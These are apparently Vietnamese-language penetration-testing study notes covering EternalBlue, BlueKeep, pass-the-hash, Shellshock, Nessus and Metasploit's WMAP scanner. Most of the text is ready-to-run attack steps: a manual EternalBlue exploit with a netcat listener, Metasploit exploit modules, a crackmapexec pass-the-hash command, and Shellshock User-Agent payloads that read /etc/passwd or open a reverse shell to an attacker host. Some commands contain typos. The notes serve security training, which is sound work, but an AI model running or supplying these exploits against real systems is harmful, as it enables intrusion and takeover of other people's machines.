# Vulnerability Assessment

- Information disclosure
- Buffer overflows
- RCE
- Privilege escalation
- DOS

`searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"`

trong MSF:

`metascploit_autopwn`

## WebDAV 

[Xem thêm](WebDAV.md)

# Vulnerability Analysis

## EternalBlue (Window MS17-010 SMB)

Tổ hợp nhiều lỗi, cho phép kẻ tấn công RCE, có quyền truy cập vào Windows (SMBv1)

`sudo nmap -sV -p 445 --script=smb-vuln-mb17-010 IP` -> enum xem hệ thống có dính vuln hay ko 

#### Khai thác thủ công: 

`https://github.com/3ndG4me/AutoBlue-MS17-010`

clone về

`cd shellcode` 

`chmod +x shell_prep.sh`

`./shell_prep.sh`

Nhâp LHOST: <IP máy của mình>, LPORT: <PORT ĐỂ NGHE LÉN phản hồi về 1234>, chọn tiếp các lựa chọn 1, 1 

`nc -nvlp 1234`

`chmod +x eternalblue_exploit7.py`

`python eternalblue_exploit7.py IP shellcode/sc_x64.bin`

trở lại tab `nc -nvlp 1234` ta thấy đã có shell 

#### Khai thác tự động với MSF

Bật MSF:

`search eternalblue`

scan bằng module: `auxiliary/scanner/smb/smb_ms17_010`

Khai thác bằng module: `exploit/windows/smb/ms17_010_eternalblue`

`use exploit/windows/smb/ms17_010_eternalblue`

`set RHOSTS <IP mục tiêu>`

`exploit`

Đợi 1 lúc chúng ta đã vào được shell 


## BlueKeep (CVE-2019-0708 RDP Vulnerability) - MICROSOFT

Lỗ hổng do MS phát hiện, Không có PoC công khai từ MS 

Xác định RDP có bật trên target

`sudo nmap -p 3389 IP`

Trong MSF:

`search BlueKeep`

`use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`

`set RHOSTS IP`

`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`

`set RHOSTS IP`

`show targets`

`set target 2`

## Pass-the-hash Attack

Sử dụng 2 tools: Metasploit PsExec module và Crackmapexec

module: `exploit/windows/smb/psexec`

`crackmapexec smb IP -u Username -H "Hash password" -x "ipconfig"`

## Shellshock (CVE-2014-6271) - LINUX

Enum với 1 path có file cgi:

`nmap -sV IP --script=http-shellshock --scripy-args "http-shellshock.uri=/gettime.cgi"`

Khai thác: sửa `user-agent` trong request thành: `() { :' }; echo; echo; /bin/bash -c 'cat /etc/passwd'`

Để có shell, mở 1 port listen trên attacker: `nc -nvlp 1234` và sửa user-agent: `() { :' }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/IP/1234 0>&1'`

Với MSF:

module: `exploit/multi/http/apache_mod_cgi_bash_env_exec`

`set RHOSTS IP`

`set TARGETURI /<path đến file cgi>`
 

# Vulnerability Scanning

## Vulnerability Scanning with Nessus

Dùng nessus để quét lỗ hổng trên hệ thống

Cài đặt:

`chmod +x <>.deb`

`sudo dpkg -i <>.deb`

Start: `sudo systemctl start nessusd.service`

Xuất nessus

nhập vào MSF:

`db_import /<path to file>`

## WMAP (Web App Vulnerability Scan)

MSF plug-in 

vào MSF:

`load wmap`

Có các options: `wmap_modules`, `wmap_nodes`, `wmap_run`, `wmap_sites`, `wmap_targets`, `wmap_vulns`

`wmap_sites -a IP`

`wmap_targets -t http://IP/path`

`wmap_run -t` -> liệt kê các module có thể sử dụng để scan 

`wmap_run -e` -> để chạy tất cả module đã được liệt kê ra 






